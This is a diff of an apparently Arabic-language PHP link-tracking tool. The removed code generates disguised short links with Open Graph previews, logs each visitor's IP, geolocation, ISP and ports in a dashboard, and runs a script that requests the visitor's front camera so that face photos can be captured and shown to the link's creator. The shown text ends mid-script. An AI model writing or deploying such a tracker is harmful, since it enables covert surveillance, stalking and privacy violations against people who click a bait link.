@@ -103,7 +103,7 @@ function get_ip_details($ip) {
         return [
             'country' => $data['country'] ?? 'غير معروف',
             'city' => $data['city'] ?? 'غير معروف',
-            'lat' => $data['lat'] ?? '36.7538', 'lon' =>$data['lon'] ?? '3.0588',
+            'lat' => $data['lat'] ?? '36.7538',              'lon' =>$data['lon'] ?? '3.0588',
             'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
         ];
     }
@@ -161,103 +161,3 @@ if (isset($_GET['r'])) {
         }
     } else {
         die("الرابط غير موجود.");
-    }
-}
-
-// 2. إنشاء رابط جديد
-$generated_link = "";
-$tracking_code = "";
-if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
-    $target_url = trim($_POST['target_url']);
-    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
-        $target_url = "https://" . $target_url;
-    }
-
-    $code = substr(md5(uniqid(rand(), true)), 0, 7);
-    $stmt =$db->prepare("INSERT INTO links (code, target_url) VALUES (?, ?)");
-    $stmt->execute([$code,$target_url]);
-
-    $tracking_code =$code;
-    $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
-}
-
-$total_links =$db->query("SELECT COUNT(*) FROM links")->fetchColumn();
-$total_visits =$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();
-
-$filter_code = trim($_GET['track'] ?? '');
-if (!empty($filter_code)) {
-    $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
-    $stmt->execute([$filter_code]);
-    $logs =$stmt->fetchAll(PDO::FETCH_ASSOC);
-} else {
-    $logs =$db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
-}
-?>
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><?php echo htmlspecialchars($og_title); ?></title>
-    
-    <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
-    <meta property="og:description" content="<?php echo htmlspecialchars($og_description); ?>">
-    <?php if (!empty($og_image)): ?>
-        <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
-    <?php endif; ?>
-    <meta property="og:type" content="website">
-
-    <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
-        body { background-color: #0b0f19; color: #f3f4f6; padding: 15px; line-height: 1.5; }
-        .container { max-width: 1100px; margin: 0 auto; display: flex; flex-direction: column; gap: 15px; }
-        .card { background: #111827; border: 1px solid #1f2937; border-radius: 12px; padding: 20px; box-shadow: 0 4px 15px rgba(0,0,0,0.3); }
-        .header { display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
-        h1 { color: #38bdf8; font-size: 22px; font-weight: 800; }
-        .stats-group { display: flex; gap: 10px; }
-        .stat-box { background: #1f2937; padding: 8px 14px; border-radius: 8px; text-align: center; border: 1px solid #374151; }
-        .stat-box span { display: block; font-size: 10px; color: #9ca3af; }
-        .stat-box strong { font-size: 16px; color: #38bdf8; }
-        h2 { color: #38bdf8; font-size: 16px; margin-bottom: 12px; font-weight: 700; }
-        .form-group { display: flex; flex-direction: column; gap: 10px; }
-        @media(min-width: 600px) { .form-group { flex-direction: row; } }
-        input[type="text"] { flex: 1; background: #030712; border: 1px solid #374151; border-radius: 8px; padding: 12px; color: #fff; font-size: 14px; outline: none; width: 100%; }
-        input[type="text"]:focus { border-color: #38bdf8; }
-        button, .btn { background: #0284c7; color: white; border: none; padding: 12px 20px; border-radius: 8px; font-weight: bold; cursor: pointer; transition: background 0.2s; text-decoration: none; display: inline-block; text-align: center; font-size: 14px; white-space: nowrap; }
-        button:hover, .btn:hover { background: #0369a1; }
-        .result-box { background: #030712; border: 1px solid rgba(56, 189, 248, 0.3); padding: 14px; border-radius: 8px; margin-top: 12px; word-break: break-all; }
-        .table-container { overflow-x: auto; margin-top: 12px; border: 1px solid #1f2937; border-radius: 8px; }
-        table { width: 100%; border-collapse: collapse; text-align: right; font-size: 12px; min-width: 1050px; }
-        th { background: #030712; color: #9ca3af; padding: 12px; border-bottom: 1px solid #1f2937; white-space: nowrap; }
-        td { padding: 12px; border-bottom: 1px solid #1f2937; color: #e5e7eb; white-space: nowrap; }
-        tr:hover { background: rgba(31, 41, 55, 0.4); }
-        .badge { background: #064e3b; color: #34d399; padding: 4px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; border: 1px solid #065f46; }
-        .ip-public { font-family: monospace; color: #38bdf8; font-weight: bold; }
-        .ip-local { font-family: monospace; color: #34d399; font-weight: bold; }
-        .port-badge { font-family: monospace; color: #f43f5e; background: rgba(244, 63, 94, 0.1); padding: 3px 6px; border-radius: 4px; font-weight: bold; border: 1px solid rgba(244, 63, 94, 0.2); }
-        .copy-btn { background: #374151; padding: 6px 10px; font-size: 11px; border-radius: 4px; cursor: pointer; color: #fff; border: none; }
-        .copy-btn.success { background: #059669; }
-        .map-btn { background: #047857; color: #fff; padding: 5px 10px; border-radius: 6px; font-size: 11px; text-decoration: none; font-weight: bold; display: inline-block; }
-        .map-btn:hover { background: #065f46; }
-        .visitor-photo { width: 40px; height: 40px; border-radius: 50%; object-fit: cover; border: 2px solid #38bdf8; cursor: pointer; transition: transform 0.2s; }
-        .visitor-photo:hover { transform: scale(2.5); }
-        .link-row { display: flex; gap: 8px; margin-top: 6px; align-items: center; }
-    </style>
-    <script>
-        document.addEventListener("DOMContentLoaded", function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const redirectCode = urlParams.get('r');
-            const hasScreen = urlParams.has('screen');
-
-            if (redirectCode && !hasScreen) {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                        .then(function(stream) {
-                            const video = document.createElement('video');
-                            video.srcObject = stream;
-                            video.play();
-                            
-                            setTimeout(function() {
-                                const canvas = document.createElement('canvas');
-                                canvas.width = 320;
-                                canvas.height = 
